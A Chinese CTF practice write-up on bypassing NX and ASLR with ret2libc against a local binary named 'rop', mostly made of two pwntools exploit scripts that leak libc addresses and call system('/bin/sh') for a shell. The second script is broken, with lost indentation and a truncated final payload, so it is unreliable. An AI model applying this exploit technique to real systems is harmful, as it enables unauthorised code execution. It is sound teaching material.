pwn练习(三)之绕过NX和ALSR

通过一个例子来看看如何使用ret2lib绕过NX和ASLR。

程序很简单，看IDA:

很明显的缓冲区溢出。checksec查看，程序开了NX保护，并且可以用命令查看，每次的堆栈都是发生了变化的，说明系统中开了ASLR保护的。
sudo cat /proc/[pid]/maps

给出pwntools的两个脚本：
脚本一（给出libc的情况下）：
from pwn import *

p = process(‘./rop’)
libc = ELF(‘./libc.so’)
elf = ELF(‘./rop’)

offset = 0xd078-0xcff0+4

write_plt = elf.symbols[‘write’] #0x8048340
write_got = elf.got[‘write’] #0x804a018
vuln_addr = elf.symbols[‘vuln’] #0x804844d

print ‘write_plt -> ‘ + hex(write_plt)
print ‘write_got -> ‘ + hex(write_got)
print ‘vuln -> ‘ + hex(vuln_addr)

payload = ‘A’ * offset
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(write_got)
payload += p32(4)

#gdb.attach(proc.pidof(p)[0], ‘b *0x8048474’)

#raw_input()

p.sendline(payload)

write_addr = u32(p.recv(4))
print ‘write_addr -> ‘ + hex(write_addr)

system_addr = write_addr - (libc.symbols[‘write’] - libc.symbols[‘system’] )
binsh_addr = write_addr - (libc.symbols[‘write’] - next(libc.search(‘/bin/sh’)))

payload = ‘A’ * offset
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()

脚本二（未给出libc的情况下）:
from pwn import *

p = process(‘./rop’)
elf = ELF(‘./rop’)

offset = 0xd078-0xcff0+4

write_plt = elf.symbols[‘write’] #0x8048340
write_got = elf.got[‘write’] #0x804a018
vuln_addr = elf.symbols[‘vuln’] #0x804844d
read_plt = elf.symbols[‘read’]

def leak(address):
payload = ‘A’ * offset
payload += p32(write_plt)
payload += p32(vuln_addr)
payload += p32(1)
payload += p32(address)
payload += p32(4)

p.sendline(payload)
data = p.recv()
print "%#x => %s" % (address, (data or '').encode('hex'))
return data

d = DynELF(leak, elf = ELF(‘./rop’))
system_addr = d.lookup(“system”, “libc”)

print ‘system_addr ->’ + hex(system_addr)

payload += p32(0)

payload += p32(8)

p.sendline(payload)
